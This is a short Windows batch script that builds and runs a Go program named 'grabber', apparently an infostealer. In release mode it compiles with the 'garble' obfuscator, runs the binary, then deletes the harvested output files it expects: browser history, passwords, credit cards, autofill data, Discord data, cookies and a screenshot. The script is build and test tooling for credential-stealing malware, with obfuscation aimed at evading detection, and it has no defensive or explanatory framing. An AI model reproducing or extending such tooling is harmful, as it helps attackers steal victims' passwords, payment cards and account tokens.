@echo off

if "%1"=="" (
    set "debug=0"
) else (
    set "debug=%1"
)

if %debug%==0 (
    garble -tiny build .

    grabber.exe

    del history.json || echo "history.json not found"
    del passwords.json || echo "passwords.json not found"
    REM del cookies.txt || echo "cookies.txt not found"
    del cards.json || echo "cards.json not found"
    del downloads.json || echo "downloads.json not found"
    del autofill.json || echo "autofill.json not found"
    del discord.json || echo "discord.json not found"
    del screenshot.png || echo "screenshot.png not found"

) else (
    go build .

    grabber.exe

)

pause

del grabber.exe || echo "grabber.exe not found"

pause
exit